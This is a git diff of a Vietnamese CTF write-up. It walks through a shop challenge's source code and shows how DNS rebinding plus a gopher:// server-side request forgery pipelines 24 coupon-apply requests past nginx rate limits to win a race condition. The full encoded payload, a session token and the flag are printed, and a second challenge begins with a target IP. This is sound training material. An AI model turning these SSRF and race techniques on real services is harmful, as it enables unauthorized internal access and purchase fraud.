@@ -3665,13 +3665,275 @@ $\implies$ user_id được leak ra: `d680695a4383fbde39c1b876dda3933f`
 
 ![alt text](images/image-46.png)
 
+## Recon
+
+Khi đọc source code, mình có thể nhận ra hướng đi để giải chall này có liên quan tới SSRF
+
+1. Hàm kiểm tra ip nội bộ:
+<details>
+    <summary>fetcher.js:4-18</summary>
+
+```
+function isInternalIp(ip) {
+  if (!ip) return true;
+  if (ip.includes(":")) {
+    const v = ip.toLowerCase();
+    return v === "::1" || v === "::" || v.startsWith("fe80") || v.startsWith("fc") || v.startsWith("fd");
+  }
+  const o = ip.split(".").map(Number);
+  if (o.length !== 4 || o.some(n => Number.isNaN(n))) return true;
+  if (o[0] === 0 || o[0] === 127) return true;
+  if (o[0] === 10) return true;
+  if (o[0] === 172 && o[1] >= 16 && o[1] <= 31) return true;
+  if (o[0] === 192 && o[1] === 168) return true;
+  if (o[0] === 169 && o[1] === 254) return true;
+  return false;
+}
+```
+
+</details>
+
+Với IPv4, hàm chặn:
+-0.x.x.x, 127.x.x.x
+- 10.x.x.x
+- 172.16.x.x đến 172.31.x.x
+- 192.168.x.x
+- 169.254.x.x
+
+2. Hàm tải nội dung của URL đó bằng cách chạy chương trình curl
+
+<details>
+    <summary>fetcher.js:4-18</summary>
+
+```
+async function curlFetch(url) {
+  if (!url || typeof url !== "string") throw new Error("Invalid url");
+
+  const trimmed = url.trim();
+  if (trimmed.toLowerCase().startsWith("file:")) {
+    throw new Error("file:// scheme is blocked");
+  }
+
+  let parsed;
+  try { parsed = new URL(trimmed); } catch { throw new Error("Invalid url"); }
+
+  let addr;
+  try { addr = (await dns.lookup(parsed.hostname)).address; }
+  catch { throw new Error("host resolution failed"); }
+  if (isInternalIp(addr)) throw new Error("internal address blocked");
+
+  return new Promise((resolve, reject) => {
+    const args = ["-s", "-L", "--max-time", "4", trimmed];
+    const child = spawn("curl", args, { timeout: 5000 }); // --> Sink
+
+    let stdout = "";
+    let stderr = "";
+    let killed = false;
+
+    const timer = setTimeout(() => {
+      killed = true;
+      child.kill("SIGKILL");
+      reject(new Error("curl timeout"));
+    }, 5000);
+
+    child.stdout.on("data", (d) => { stdout += d.toString(); });
+    child.stderr.on("data", (d) => { stderr += d.toString(); });
+
+    child.on("error", (e) => {
+      clearTimeout(timer);
+      reject(e);
+    });
+
+    child.on("close", (code) => {
+      clearTimeout(timer);
+      if (killed) return;
+      if (code !== 0 && !stdout) {
+        return reject(new Error(stderr || `curl exit ${code}`));
+      }
+      resolve(stdout);
+    });
+  });
+}
+```
+
+</details>
+
+- Từ chối URL `file://`
+- Phân tích URL, tra IP của hostname và chặn một số địa chỉ nội bộ
+- Chạy curl -L để gửi request
+- Trả nội dung response về cho nơi gọi
+
+3. Hàm nhận lệnh và URL, đưa vào `fetcher.js`
+
+<details>
+    <summary>webhook.js</summary>
+
+```
+module.exports = (db) => {
+
+  router.post("/send", requireAuth, async (req, res) => {
+    const callbackUrl = (req.body.callbackUrl || req.body.url || "").trim();
+    if (!callbackUrl) return res.status(400).json({ ok: false, error: "missing callbackUrl" });
+    try {
+      const raw = await curlFetch(callbackUrl);
+      return res.json({ ok: true, response: raw.slice(0, 2000) });
+    } catch (e) {
+      return res.status(502).json({ ok: false, error: String(e.message).slice(0, 200) });
+    }
+  });
+
+  return router;
+};
+```
+
+</details>
+
+- Nhận URL từ `callbackUrl`
+- Gọi `curlFetch()` để server truy cập URL đó, trả nội dung response về cho người gửi
+
+Thế nhưng, mục tiêu là mua Legendary Skin (VIP) với mức giá **1000 coin**, trong khi chỉ có trong tay một voucher giảm **50 coin**
+
+&rarr; Khả năng sẽ có thêm lỗ hổng Race condition, áp 1 voucher nhiều lần liên tiếp
+
+4. Rate limit và giới hạn kết nối của Nginx
+
+<details>
+    <summary>deploy/nginx/nginx.conf</summary>
+
+```
+http {
+    include /etc/nginx/mime.types;
+    default_type application/octet-stream;
+    sendfile on;
+    keepalive_timeout 65;
+    client_max_body_size 1m;
+
+    limit_req_zone  $binary_remote_addr zone=coupon_req:10m  rate=1r/s;
+    limit_conn_zone $binary_remote_addr zone=coupon_conn:10m;
+    limit_req_zone  $binary_remote_addr zone=vendor_req:10m  rate=1r/s;
+    limit_conn_zone $binary_remote_addr zone=vendor_conn:10m;
+    limit_req_zone  $binary_remote_addr zone=general:10m     rate=30r/s;
+    limit_req_status  429;
+    limit_conn_status 503;
+
+    upstream webapp { server web-app:3000; }
+
+    server {
+        listen 80;
+        server_name _;
+
+        limit_req zone=general burst=60 nodelay;
+
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
+        location = /health {
+            default_type application/json;
+            return 200 '{"status":"ok"}';
+        }
+
+        location ~* ^/(order|purchase)/[^/]+/apply {
+            limit_req  zone=coupon_req burst=1 nodelay;
+            limit_conn coupon_conn 1;
+            proxy_pass http://webapp;
+        }
+
+        location ~* ^/webhook {
+            limit_req  zone=vendor_req burst=1 nodelay;
+            limit_conn vendor_conn 1;
+            proxy_pass http://webapp;
+        }
+
+        location / {
+            proxy_pass http://webapp;
+        }
+    }
+}
+```
+
+</details>
+
+- Khai báo giới hạn cho coupon: 1r/s và vùng đếm kết nối theo IP.
+- Áp dụng `limit_req ... burst=1 nodelay` và `limit_conn ... 1`cho `/order/.../apply`.
+- Áp dụng giới hạn tương tự cho `/webhook`.
+
+&rarr; Mọi endpoint để tương tác trên web đã bị rate limit, không thể bypass bằng cách ghép nhiều request và `Send group in parallel` được
+
+5. Hướng khai thác 
+
+**Rate limit trong nginx.conf:**
+
+\- `webhook.js` chuyển `curlbackUrl` cho `curlFetch()`, lệnh curl chạy bên trong container web-app, request đi thẳng vào api Express, độc lập so với Nginx
+
+![alt text](images/image-49.png)
+
+**Black-list một số IP nội bộ:**
+
+\- Không thể trỏ thẳng tới 127.0.0.1 hay localhost, vì `curlFetch()` tra DNS rồi chặn IP nội bộ.
+
+```
+let addr;
+try { addr = (await dns.lookup(parsed.hostname)).address; }
+catch { throw new Error("host resolution failed"); }
+if (isInternalIp(addr)) throw new Error("internal address blocked");
+```
+
+\- Giải phép: Sử dụng DNS rebinding
+- Hostname trả về IP public lúc Node.js kiểm tra
+- Trả về 127.0.0.1 khi curl phân giải hostname để kết nối 
+
+&rarr; Địa chỉ curl kết nối tới khác địa chỉ đã được kiểm tra
+
+**Black-list scheme `file:`**
+```
+const trimmed = url.trim();
+  if (trimmed.toLowerCase().startsWith("file:")) {
+    throw new Error("file:// scheme is blocked");
+}
+```
+
+\- Nếu chỉ chặn `file://` là chưa đủ
+
+\- Gopher là cơ chế mà ta hướng đến do rất nhiều chall về SSRF thường xuyên có sự xuất hiện của nó. Gopher là một giao thức dùng trong việc phân phối, tìm kiếm và truy cập tài nguyên, tài liệu trên nền mạng Internet.
+
+\- Cơ chế: Với URL dạng `gopher://<host>:<port>/_<selector>`, curl bỏ phần `/` và ký tự loại mục `_`, URL-decode phần còn lại
+rồi gửi selector tới host và port. 
+- Trong payload, selector chứa các byte của một HTTP request đã URL-encode. Khi %0D%0A được decode thành CRLF, chúng
+phân cách request line, header và body
+-  Selector được hiểu như chuỗi client gửi để chọn tài nguyên
+- Khi này nhiều request có thể được nối thành HTTP pipeline
+
+*Lưu ý:* Đây là cách curl chuyển selector tới cổng Express, không phải Gopher tự tạo HTTP request
+
+**Gopher payload:** `gopher://make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms:3000/`
+
+6. Cấu trúc payload
+
+\- Luồng tài nguyên cần gọi là request `POST /order/1/apply`. Gồm cookie hợp lệ và body là `coupon=KMACTF`
+
+\- Mỗi request trong Gopher có dạng:
+```
+POST /order/1/apply HTTP/1.1
+Host: x
+Cookie: session=<SESSION>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+Connection: keep-alive
+
+coupon=KMACTF
+```
+
+\- Lưu ý:
+- Ghép nhiều request liền kề, đổi Connection thành close ở request cuối
+- URL-encode toàn bộ các request rồi đặt vào selector của Gopher URL. 
+
 ## Exploit
 
 1.  Thông qua `/register`, tạo một tài khoản với thông tin `meo:meo`
 
 2. Tại giao diện dòng lệnh, đăng nhập với `meo:meo` và lưu vào $SESSION
 
-![alt text](images/image-49.png)
 
 3. Tạo script khai thác Race condition
 
@@ -3722,15 +3984,18 @@ print(f"User-Agent: {user_agent}")
 
 </details>
 
-\- Nó đọc JWT từ biến môi trường SESSION, dựng 24 request `POST /order/1/apply` (lấy dư) để áp coupon KMACTF, rồi ghép chúng thành một chuỗi HTTP pipelining.
+![alt text](images/image-52.png)
+
+\- Nó đọc JWT từ biến môi trường SESSION, dựng 24 request `POST /order/1/apply` (lấy dư) để áp coupon KMACTF, rồi ghép chúng thành một chuỗi pipeline HTTP
 
 \- Chuỗi này được URL-encode thành gopher URL trỏ tới hostname dùng DNS rebinding, sau đó ghi
-  vào race.json dưới dạng JSON với trường callbackUrl.
+  vào `race.json` dưới dạng JSON với trường callbackUrl.
 
-4. Chạy script và gửi output `race.json` vào webhook
+4. Đưa nội dung file race.json vào body gửi đến `POST /webhook/send`
 
+**Payload:**
 <details>
-    <summary>race.json</summary>
+    <summary> race.json</summary>
 
 ```
 {"callbackUrl": "gopher://make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms:3000/_POST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20close%0D%0A%0D%0Acoupon%3DKMACTF"}
@@ -3752,3 +4017,250 @@ print(f"User-Agent: {user_agent}")
 ![alt text](images/image-48.png)
 
 > KMACTF{a2f86cfd17815978b5808130462db76c6dcbbd1976cbceffeeef8ef552787b90}
+
+# PokeDex
+
+![alt text](images/image-51.png)
+
+> **Target:** `http://67.223.119.69:30000/`
+> **Hint:** `PATH_INFO`
+> **Category:** Web Exploitation
+
+## Recon
+
+### Fingerprint
+
+```
+HTTP/1.1 200 OK
+Server: nginx/1.27.5
+Content-Type: text/html
+Content-Length: 10711
+```
+
+- Nginx 1.27.5
